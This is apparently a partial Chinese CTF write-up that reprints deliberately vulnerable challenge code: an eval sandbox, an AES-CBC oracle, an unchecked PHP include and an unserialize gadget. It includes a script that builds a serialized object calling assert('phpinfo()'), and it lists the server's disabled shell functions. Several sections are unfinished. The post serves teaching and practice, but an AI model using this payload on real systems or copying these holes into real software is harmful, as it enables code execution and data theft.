---
title: ha1cyon-ctf
date: 2020-04-19 20:52:53
updated: 2020-04-19 20:52:53
tags:
 - 日常水题
 - 待补充
categories:
 - 刷题记录
---

# web

## 验证🐎

给了源码

```js
const express = require('express');
const bodyParser = require('body-parser');
const cookieSession = require('cookie-session');

const fs = require('fs');
const crypto = require('crypto');

const keys = require('./key.js').keys;

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

function saferEval(str) {
  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
    return null;
  }
  return eval(str);
} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个

const template = fs.readFileSync('./index.html').toString();
function render(results) {
  return template.replace('{{results}}', results.join('<br/>'));
}

const app = express();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use(cookieSession({
  name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给👴爪⑧
  keys
}));

Object.freeze(Object);
Object.freeze(Math);

app.post('/', function (req, res) {
  let result = '';
  const results = req.session.results || [];
  const { e, first, second } = req.body;
  if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])) {
    if (req.body.e) {
      try {
        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';
      } catch (e) {
        console.log(e);
        result = 'Wrong Wrong Wrong!!!';
      }
      results.unshift(`${req.body.e}=${result}`);
    }
  } else {
    results.unshift('Not verified!');
  }
  if (results.length > 13) {
    results.pop();
  }
  req.session.results = results;
  res.send(render(req.session.results));
});

// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
app.get('/source', function (req, res) {
  res.set('Content-Type', 'text/javascript;charset=utf-8');
  res.send(fs.readFileSync('./index.js'));
});

app.get('/', function (req, res) {
  res.set('Content-Type', 'text/html;charset=utf-8');
  req.session.admin = req.session.admin || 0;
  res.send(render(req.session.results = req.session.results || []))
});

app.listen(80, '0.0.0.0', () => {
  console.log('Start listening')
});
```





## web🐕

给了源码

```php
 <?php 
error_reporting(0);
include('config.php');   # $key,$flag
define("METHOD", "aes-128-cbc");  //定义加密方式
define("SECRET_KEY", $key);    //定义密钥
define("IV","6666666666666666");    //定义初始向量 16个6
define("BR",'<br>');
if(!isset($_GET['source']))header('location:./index.php?source=1');


#var_dump($GLOBALS);   //听说你想看这个？
function aes_encrypt($iv,$data)
{
    echo "--------encrypt---------".BR;
    echo 'IV:'.$iv.BR;
    return base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;
}
function aes_decrypt($iv,$data)
{
    return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die('False');
}
if($_GET['method']=='encrypt')
{
    $iv = IV;
    $data = $flag;    
    echo aes_encrypt($iv,$data);
} else if($_GET['method']=="decrypt")
{
    $iv = @$_POST['iv'];
    $data = @$_POST['data'];
    echo aes_decrypt($iv,$data);
}
echo "我摊牌了，就是懒得写前端".BR;

if($_GET['source']==1)highlight_file(__FILE__);
?> 
```









## 超简单的PHP！！！超简单！！！

查看源码发现index.bak.php

点进去之后url是`http://ha1cyon-ctf.fun:30094/index.bak.php?action=message.php`

尝试使用伪协议读取源码

```php
//index.bak.php
<?php 
session_start();
if(isset($_GET['action'])){
    include $_GET['action'];
    exit();
} else {
    header("location:./index.bak.php?action=message.php");
}
```

```php+HTML
//message.php
<html>
<head>
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link href="static/bootstrap.min.css" rel="stylesheet" type="text/css">

		<title>X佬留言板</title>
	</head>
	<body>
		<div class="container">
			<h1>👴过留声 燕过留名</h1>
<!--			假的navbar-->
			<navbar>
				<ul class="nav nav-tabs">
				  <li class="nav-item">
					<a class="nav-link " href="./index.php">Index</a>
				  </li>
				  <li class="nav-item">
					<a class="nav-link table-active " href="./message.php">Message</a>
				  </li>
				  <li class="nav-item">
					<a class="nav-link" href="./phpinfo.php">tips</a>
				  </li>
				</ul>
			</navbar>
<!--			假的navbar-->
			<div>
				<form id="message-form">
					<textarea  id="msg" cols="45" rows="3" placeholder="🌶你进群，还不快来👴直接把⚰都给bypass给你看信不信">
```

```php
//msg.php
<?php 
header('content-type:application/json');
session_start();
function safe($msg){
    if (strlen($msg)>17){
        return "msg is too loooong!";
    } else {
        return preg_replace("/php/","?",$msg);
    }
}

if (!isset($_SESSION['msg'])&empty($_SESSION['msg']))$_SESSION['msg'] = array();

if (isset($_POST['msg']))
{
    
    array_push($_SESSION['msg'], ['msg'=>safe($_POST['msg']),'time'=>date('Y-m-d H:i:s',time())]);
    echo json_encode(array(['msg'=>safe($_POST['msg']),'time'=>date('Y-m-d H:i:s',time())]));
    exit();
}
if(!empty($_SESSION['msg'])){
        echo json_encode($_SESSION['msg']);
} else {echo "还不快去留言！";}
?>
```





## RealEzPHP

查看源码发现

```html
<p>百万前端的NPU报时中心为您报时：<a href="./time.php?source"></a></p>
```

点击之后得time.php到源码

```php
 <?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);

```

编写脚本经过测试，部分函数被禁用。

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "phpinfo()";
        $this->b = "assert";
    }
    }

$c = new HelloPhp;


echo serialize($c); //O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}
```

查看phpinfo被禁用如下函数

```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,scadnir,readfile,show_source,fpassthru,readdir
```

后面查找发现flag在phpinfo中



## 查源码

url前面加上 view-source:



## ezinclude

查看源码得到

```html
username/password error<html>
<!--md5($secret.$name)===$pass -->
</html>
```



## ezlogin







# crypto

## Classical Cipher

打开文件，key.txt内容为

```
解密后的flag请用flag{}包裹

压缩包密码：gsv_pvb_rh_zgyzhs

对应明文：   ***_key_**_******
```

目测凯撒，或者维吉尼亚密码，丢进quipquip，得到密码

```
the_key_is_atbash
```

之后是一张图片

j  pplj j  k







